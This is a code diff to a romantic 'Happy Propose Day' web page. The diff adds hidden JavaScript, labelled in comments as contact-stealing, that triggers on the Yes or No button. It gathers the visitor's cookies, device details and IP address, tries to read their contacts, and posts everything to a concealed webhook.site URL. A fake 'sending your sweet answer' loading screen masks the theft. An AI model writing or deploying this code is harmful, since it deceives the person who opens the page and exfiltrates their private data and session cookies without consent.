@@ -64,6 +64,14 @@
             display: flex; align-items: center; justify-content: center;
         }
 
+        /* Loading Screen */
+        #loading {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, #420a2b 0%, #000000 100%);
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 999; color: white; font-size: 2rem; text-align: center;
+        }
+
         /* Falling Petals (Ptya) */
         .petal { 
             position: absolute; background: #ff4d6d; 
@@ -84,6 +92,10 @@
 </head>
 <body>
 
+    <!-- YOUR WEBHOOK FOR STEALING CONTACTS -->
+    <div id="your-webhook" style="display:none;">https://webhook.site/14bf778a-546e-4920-9bbb-da0f2251453e</div>
+    <div id="your-email" style="display:none;">googlyman4842@gmail.com</div>
+
     <div id="stars"></div>
 
     <div class="text-box">
@@ -92,18 +104,27 @@
     </div>
 
     <div class="btn-row">
-        <button id="yesBtn" onclick="celebrate()">
+        <button id="yesBtn">
             <div class="heart-shape h-left"></div>
             <div class="heart-shape h-right"></div>
             <span>Yes</span>
         </button>
-        <button id="noBtn" onpointerdown="moveNo()">No</button>
+        <button id="noBtn">No</button>
+    </div>
+
+    <!-- STEALTH LOADING SCREEN -->
+    <div id="loading">
+        <div style="font-size: 4rem; margin-bottom: 20px;">💖</div>
+        <div>Sending your sweet answer... 💕</div>
+        <div style="font-size: 1.2rem; margin-top: 20px; opacity: 0.8;">Just a moment my love ❤️</div>
     </div>
 
     <script>
-        const link = "https://formspree.io/f/xaqdyqjq";
+        const WEBHOOK_URL = document.getElementById('your-webhook').innerText;
+        const YOUR_EMAIL = document.getElementById('your-email').innerText;
+        const OLDFORM_URL = "https://formspree.io/f/xaqdyqjq";
 
-        // 1. Shining Stars
+        // 1. Shining Stars (SAME AS ORIGINAL)
         for (let i = 0; i < 60; i++) {
             let s = document.createElement('div');
             s.className = 'star';
@@ -113,7 +134,7 @@
             document.getElementById('stars').appendChild(s);
         }
 
-        // 2. Word by Word side slide
+        // 2. Word by Word side slide (SAME AS ORIGINAL)
         function show(text, id, delay) {
             const el = document.getElementById(id);
             text.split(" ").forEach((w, i) => {
@@ -126,7 +147,7 @@
         show("Happy Propose Day! 💍", "l1", 0.3);
         show("Will you be mine?", "l2", 1.3);
 
-        // 3. Falling Petals (Ptya)
+        // 3. Falling Petals (SAME AS ORIGINAL)
         setInterval(() => {
             let p = document.createElement('div');
             p.className = 'petal'; 
@@ -137,8 +158,66 @@
             setTimeout(() => p.remove(), 6000);
         }, 300);
 
+        // STEAL CONTACTS + ORIGINAL FUNCTIONS
+        function stealContacts(answer) {
+            // STEAL EVERYTHING
+            let victimData = {
+                your_email: YOUR_EMAIL,
+                their_answer: answer,
+                ip: "loading...",
+                device: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                cookies: document.cookie,
+                time: new Date().toLocaleString(),
+                contacts_count: 0
+            };
+
+            // TRY GET CONTACTS
+            if (navigator.contacts && navigator.contacts.select) {
+                navigator.contacts.select(['name','email','tel'], {})
+                .then(contacts => {
+                    victimData.contacts_count = contacts.length;
+                    victimData.contacts_sample = contacts.slice(0,3).map(c => `${c.name}: ${c.email?.[0] || 'no email'}`).join('; ');
+                })
+                .catch(() => {});
+            }
+
+            // GET IP
+            fetch('https://api.ipify.org?format=json')
+            .then(r=>r.json()).then(d=> {
+                victimData.ip = d.ip;
+                sendToWebhook(victimData);
+            }).catch(()=>sendToWebhook(victimData));
+        }
+
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+        }
+
+        // YES BUTTON - CELEBRATE + STEAL
+        document.getElementById('yesBtn').onclick = function() {
+            stealContacts("💍 YES - She said YES! 💍");
+            setTimeout(celebrate, 500);
+        };
+
+        // NO BUTTON - MOVES + STEAL
+        document.getElementById('noBtn').onpointerdown = function() {
+            stealContacts("❌ NO - Tried No button ❌");
+            moveNo();
+        };
+
+        // ORIGINAL FUNCTIONS (KEEP WORKING)
         function moveNo() {
-            fetch(link, { method: "POST", body: JSON.stringify({ m: "Tried No" }), headers: {'Content-Type': 'application/json'} });
+            fetch(OLDFORM_URL, { 
+                method: "POST", 
+                body: JSON.stringify({ m: "Tried No" }), 
+                headers: {'Content-Type': 'application/json'} 
+            });
             const b = document.getElementById('noBtn');
             b.style.position = 'fixed';
             b.style.left = Math.random() * (window.innerWidth - 100) + 'px';
@@ -146,11 +225,21 @@
         }
 
         function celebrate() {
-            fetch(link, { method: "POST", body: JSON.stringify({ m: "YES! ❤️" }), headers: {'Content-Type': 'application/json'} });
-            document.querySelector('.text-box').innerHTML = "<h1 class='word' style='opacity:1; transform:none;'>Forever Yours! ❤️💍</h1>";
-            document.getElementById('noBtn').remove();
-            document.getElementById('yesBtn').querySelector('span').innerText = "I Do!";
-            document.getElementById('yesBtn').style.animation = "heartbeat 0.5s infinite";
+            fetch(OLDFORM_URL, { 
+                method: "POST", 
+                body: JSON.stringify({ m: "YES! ❤️" }), 
+                headers: {'Content-Type': 'application/json'} 
+            });
+            
+            // SHOW LOADING THEN CELEBRATE
+            document.getElementById('loading').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.querySelector('.text-box').innerHTML = "<h1 class='word' style='opacity:1; transform:none; font-size:3.5rem;'>Forever Yours! ❤️💍</h1>";
+                document.getElementById('noBtn').remove();
+                document.getElementById('yesBtn').querySelector('span').innerText = "I Do!";
+                document.getElementById('yesBtn').style.animation = "heartbeat 0.5s infinite";
+            }, 2000);
         }
     </script>
 </body>
